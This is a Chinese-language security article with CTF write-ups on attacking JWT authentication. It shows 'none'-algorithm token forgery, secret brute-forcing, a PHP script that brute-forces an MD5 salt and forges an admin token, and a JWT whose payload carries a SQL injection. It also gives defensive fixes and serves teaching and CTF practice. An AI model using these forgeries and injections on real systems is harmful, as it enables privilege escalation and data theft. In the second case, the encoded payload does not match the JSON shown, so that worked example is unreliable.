---
title: JWT漏洞原理与实战利用
description: 系统梳理 JWT 结构、常见漏洞（算法混淆、密钥爆破、None Algorithm、信息泄露）及利用工具，结合 DDCTF 与 0w1Club
  CTF 实战复现垂直越权、盐值离线爆破、SQL 注入绕过全过程。
category: ai-security
tags:
- JWT
- 漏洞利用
- DDCTF
- 0w1Club
- CTF
- 垂直越权
- 算法混淆
- 密钥爆破
- MD5盐值爆破
- None Algorithm
- SQL注入
- 信息泄露
date: '2023-04-16'
updated: '2026-11-14'
---

## JWT 结构详解

典型的 JWT 由三个部分组成，每部分之间用 `.` 分隔：**Header**、**Payload**、**Signature**。

### Header

头部包含签名算法与令牌类型，通常为 JSON 格式，经 Base64URL 编码后传输。

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- `alg`：签名算法（如 HS256、RS256、none 等）
- `typ`：令牌类型，固定为 `JWT`

### Payload

载荷包含业务数据与标准声明，同样经 Base64URL 编码。标准字段包括：

| 字段 | 含义 |
|------|------|
| `iss` | 签发人 |
| `exp` | 过期时间 |
| `iat` | 签发时间 |
| `nbf` | 生效时间 |
| `jti` | 编号 |
| `sub` | 主题 |
| `aud` | 受众 |

除标准字段外，可自定义私有字段（如 `userRole`、`name` 等）。

### Signature

签名用于防篡改，生成方式：

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

密钥仅服务器持有，泄露将导致伪造风险。

### Base64URL 编码说明

标准 Base64 可能出现 `+`、`/`、`=`，不适合 URL 传参。Base64URL 将 `+`→`-`、`/`→`_`、去掉末尾 `=`。

## JWT 使用方式

- 客户端登录成功后获取 JWT，存储于 Cookie / localStorage。
- 后续请求通过以下方式携带：
  - Cookie（同域自动发送）
  - `Authorization: Bearer <token>` 请求头
  - URL 参数或 POST Body

## JWT 安全注意事项

1. **默认不加密**：Payload 仅编码，不可存放敏感信息。
2. **密钥保密**：签名密钥一旦泄露，攻击者可伪造任意 Token。
3. **无状态不可撤销**：签发后无法主动失效，建议设置较短 `exp` 并配合黑名单机制。
4. **传输加密**：必须使用 HTTPS 防止中间人窃取。

## DDCTF 实战复现：垂直越权漏洞利用

### 题目环境与初步分析

- 目标地址：`http://117.51.136.197/`
- 两个关键接口：
  1. `POST /admin/login`：传 `username`、`pwd`，返回 JWT。
  2. `POST /admin/auth`：传 `username`、`pwd`、`token`，校验权限。

首次登录 `admin` 账号，返回 Token 解码后 `userRole=GUEST`，提示需要 `ADMIN` 权限。

### 步骤一：获取并解码 JWT

登录响应 `data` 字段为典型三段式 JWT：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkdVRVNUIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.xxx
```

解码 Header 与 Payload：

```json
// Header
{"typ":"JWT","alg":"HS256"}

// Payload
{"userRole":"GUEST","name":"admin","iat":1556499536}
```

发现 `userRole` 可控，若能修改为 `ADMIN` 并绕过签名校验，即可实现垂直越权。

### 步骤二：尝试算法混淆攻击

**原理**：若服务端支持 `alg: "none"`，则忽略签名验证，仅需 Header+Payload。

构造脚本（参考 [JwtExploit](https://github.com/ShadowFlow123/JwtExploit/blob/master/jwtNone.py)）生成 Token：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.
```

请求 `/admin/auth` 返回 **Token 不合法**，说明服务端禁用了 `none` 算法。

### 步骤三：密钥爆破

HS256 为对称加密，密钥强度取决于复杂度。使用字典爆破脚本（参考 [jwtBrute.py](https://github.com/ShadowFlow123/JwtExploit/blob/master/jwtBrute.py)）跑出密钥：**`admin`**（规律：密钥即用户名）。

### 步骤四：构造恶意 JWT 实现越权

利用爆破出的密钥 `admin`，按以下步骤构造合法 Token：

1. **Header Base64URL**  
   `{"typ":"JWT","alg":"HS256"}` → `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`

2. **Payload Base64URL**  
   `{"userRole":"ADMIN","name":"admin","iat":1556499536}` → `eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ`

3. **签名计算**  
   对 `header.payload` 使用 HMAC-SHA256，密钥 `admin`：  
   `HMACSHA256("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ", "admin")`  
   → `J5Lqm1twIWhIPU4V8G5jHzKhPFlkYju2U6aSVo9e3Lc`

4. **拼接完整 Token**  
   `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.J5Lqm1twIWhIPU4V8G5jHzKhPFlkYju2U6aSVo9e3Lc`

携带该 Token 请求 `/admin/auth`，成功获取 Flag 页面：`http://117.51.136.197/B5Itb8dFDaSFWZZo/client`。

> 也可使用 [jwt.io Debugger](https://jwt.io/) 可视化完成上述构造。

## 0w1Club CTF 实战案例补充

### 案例一：JWT MD5 盐值离线爆破伪造 admin token

**来源**：[[0w1club-ctf-web-writeup-jwt-sqli-brute]] 第 03 题

#### 题目场景
- 登录测试账号后，Cookie 中包含 JWT 认证令牌
- Base64 解码发现采用 **MD5 加盐方式** 签名（非标准 HS256）
- 后端验证逻辑：`signature = MD5(header + "." + payload + salt)`

#### 攻击思路
1. **获取合法 JWT**：使用测试账号登录，捕获 Cookie 中的 token
2. **离线爆破盐值**：编写脚本（推荐 PHP 保持与后端一致），对盐值进行字典爆破
   - 爆破目标：`MD5(base64(header) + "." + base64(payload) + salt) === signature`
   - 盐值通常较短、规律性强（如用户名、固定字符串等）
3. **伪造管理员 Token**：
   - 修改 Payload 中 `userRole` 为 `admin` / `ADMIN`
   - 使用爆破出的盐值重新计算签名
   - 替换 Cookie 中的 token 刷新页面，越权访问管理员功能获取 flag

#### 关键代码片段（PHP 示例）
```php
// 爆破盐值
$salt_dict = file('dict.txt', FILE_IGNORE_NEW_LINES);
foreach ($salt_dict as $salt) {
    $calc_sign = md5($header_b64 . '.' . $payload_b64 . $salt);
    if ($calc_sign === $signature) {
        echo "Found salt: $salt";
        break;
    }
}

// 伪造 admin token
$new_payload = '{"userRole":"admin","name":"admin","iat":'.time().'}';
$new_payload_b64 = base64_url_encode($new_payload);
$new_sign = md5($header_b64 . '.' . $new_payload_b64 . $found_salt);
$forged_token = $header_b64 . '.' . $new_payload_b64 . '.' . $new_sign;
```

#### 防御建议
- 使用标准算法（HS256/RS256）而非自制签名方案
- 盐值/密钥需足够长、高熵，避免规律性
- 服务端应严格校验算法字段，拒绝非预期算法

---

### 案例二：None Algorithm 漏洞绕过签名验证并注入 SQL 语句获取 flag

**来源**：[[0w1club-ctf-web-writeup-jwt-sqli-brute]] 第 05 题

#### 题目场景
- 页面存在数据库交互特征，疑似 SQL 注入点
- 认证采用 JWT，Cookie 中传递 token
- 后端解析 JWT 后，将 `username` / `name` 字段直接拼接进 SQL 查询

#### 攻击链分析
1. **识别注入点**：推测后端查询类似 `SELECT * FROM users WHERE username = '<jwt_payload_name>'`
2. **绕过签名验证**：利用 **None Algorithm 漏洞**（`alg: "none"`）
   - 服务端若未显式禁用 `none` 算法，会跳过签名校验
   - 构造 Header：`{"typ":"JWT","alg":"none"}` → Base64URL 编码
   - 构造 Payload：注入 SQL 语句于可控字段（如 `name` 或 `username`）
   - Signature 留空（仅保留两个点分隔符）
3. **构造恶意 Payload 示例**：
   ```json
   {
     "username": "admin' UNION SELECT flag FROM chest--",
     "userRole": "ADMIN"
   }
   ```
4. **发送请求**：携带伪造的 `header.payload.` 访问目标接口，触发 SQL 注入，从 `chest` 表中查出 flag

#### 完整 Token 构造流程
```
Header:    eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
Payload:   eyJ1c2VybmFtZSI6ImFkbWluJyBVUklPTiBTRUxFQ1QgZmxhZyBGUk9NIENIRVNULS0iLCJ1c2VyUm9sZSI6IkFETUlOIn0
Signature: (空)
Token:     eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluJyBVUklPTiBTRUxFQ1QgZmxhZyBGUk9NIENIRVNULS0iLCJ1c2VyUm9sZSI6IkFETUlOIn0.
```

#### 根因与修复
| 根因 | 修复措施 |
|------|----------|
| 服务端未校验 `alg` 字段，允许 `none` 算法 | 显式维护算法白名单（仅允许 HS256/RS256 等），拒绝 `none` |
| JWT 解析后的用户输入直接拼接 SQL | 使用参数化查询 / 预编译语句 |
| 业务逻辑过度信任客户端传递的身份标识 | 服务端维护会话映射，JWT 仅作标识不作授权依据 |

## 利用工具与脚本

- **JwtExploit** 系列脚本（GitHub）：  
  - `jwtNone.py`：算法混淆生成 `none` 算法 Token  
  - `jwtBrute.py`：HS256 密钥字典爆破
- **CyberChef** / **jwt.io** ：Base64URL 编解码、签名计算、Token 调试
- **Burp Suite** 插件：JWT Editor、JSON Web Tokens 支持自动化测试
- **自定义脚本**：针对非标准签名（如 MD5+salt）需自行编写爆破/伪造脚本，建议与后端语言保持一致（PHP/Python/Node.js/Go）

## 交叉引用与延伸阅读

- [[0w1club-ctf-web-writeup-jwt-sqli-brute]] — 0w1Club CTF Web 方向完整 Writeup，含 Base64+Brainfuck 签到、.htpasswd 信息泄露、验证码绕过暴力破解等题目
- [[0w1club-ctf-web-writeup-hash-extension-rsa]] — 同源 CTF Web 题解，涵盖哈希长度扩展攻击、PHP 弱类型比较、RSA 解密等技术
- [[burpsuite-basics-tutorial]] — Burp Suite 入门教程，含 Intruder 爆破、Repeater 改包实战
- [[java-urlconnection-ssrf-protocol-bypass]] — Java SSRF 绕过技巧，可结合 JWT 场景下的协议处理缺陷理解
- [[spring-boot-devtools-deserialization-rce]] — Spring Boot DevTools 弱默认密钥导致反序列化 RCE，与 JWT 密钥管理不当同属“默认/弱密钥”风险类

## 参考资源

- 原文：[微信公众号文章](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247483879&idx=1&sn=62e66f486f9060739640bcd287237b31)
- 0w1Club 微信归档索引：[[0w1club-wechat-archive-201908-202207]]
- 作者 GitHub（DDCTF 复现脚本）：<https://github.com/ShadowFlow123/>
- 博客园对应文章：<https://www.cnblogs.com/jinbuqi/p/10361698.html>

## 来源

- [007攻防实验室-202007-202010_3](../sources/007攻防实验室-202007-202010_3.md)
- [0w1Club微信归档-201908-202207](../sources/0w1Club微信归档-201908-202207.md)
- [0w1网络安全俱乐部-201707-201903_22](../sources/0w1网络安全俱乐部-201707-201903_22.md)
